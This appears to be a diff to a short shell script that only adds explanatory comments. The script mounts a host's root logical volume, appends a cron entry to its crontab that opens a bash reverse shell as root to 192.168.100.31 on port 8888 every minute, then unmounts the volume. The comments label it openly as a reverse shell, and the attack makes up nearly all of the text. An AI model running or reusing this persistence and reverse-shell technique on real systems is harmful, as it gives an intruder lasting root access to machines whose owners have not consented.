@@ -1,6 +1,8 @@
-
+#Mount ubuntu--vg-root in tmp to create a logical volume
 mount /dev/mapper/ubuntu--vg-root /tmp 
+#Reverse shell using bash and scheduling a cron
 echo -e "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.100.31/8888 0>&1'" >> /tmp/etc/crontab 
+#Umount the logical volume
 umount /tmp
 
 exit 0
